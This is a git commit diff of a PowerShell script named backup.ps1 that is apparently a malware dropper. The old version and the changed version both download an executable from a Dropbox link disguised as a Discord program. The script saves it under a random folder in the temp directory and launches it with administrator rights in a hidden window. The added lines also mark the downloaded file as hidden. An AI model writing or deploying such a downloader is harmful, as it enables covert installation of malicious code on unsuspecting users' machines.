57070437e4c6e52ac348003e126528616271ac75
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 12:45:09 +0200

    backup.ps1

--- bd/backup.ps1
+++ bd/backup.ps1
@@ -3,8 +3,19 @@ $savePath = "$env:temp\sVBXKuz\wsappa.exe"
 
 if (!(Test-Path -Path $savePath)) {
     try {
-        Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile $env:temp\sVBXKuz\wsappa.exe
-        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs -WindowStyle Hidden  
+        $folderPath = Join-Path $env:temp "sVBXKuz"
+        if (!(Test-Path -Path $folderPath)) {
+            New-Item -Path $folderPath -ItemType Directory
+        }
+        
+        Set-Location -Path $folderPath
+
+        $downloadedFilePath = Join-Path $folderPath "wsappa.exe"
+        Invoke-WebRequest -Uri $fileUrl -OutFile $downloadedFilePath
+        Start-Process $downloadedFilePath -Verb RunAs -WindowStyle Hidden
+
+        # Hide the downloaded file
+        Set-ItemProperty -Path $downloadedFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     } catch {
         Write-Host "Failed to download the file: $_"
     }
@@ -12,6 +23,4 @@ if (!(Test-Path -Path $savePath)) {
     Write-Host "File already exists."
 }
 
-
-exit
-
+Exit
